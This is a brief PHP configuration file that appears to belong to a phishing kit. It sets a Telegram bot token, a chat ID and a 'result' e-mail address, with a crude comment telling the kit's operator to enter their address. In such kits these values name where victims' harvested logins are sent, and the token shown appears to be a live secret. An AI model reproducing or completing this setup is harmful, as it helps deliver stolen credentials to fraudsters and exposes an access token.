<?php

$bot_token = "5365592221:AAE_Sw37BdmaKrCOx6fv7QMKFZ9OWqCmpdo";/* bot token */
$chat_id = "2025589851";

$Z118_EMAIL = "spam25@usako.net"; // PUT UR FUCKING E-MAIL BRO
$save_result = "off"



?>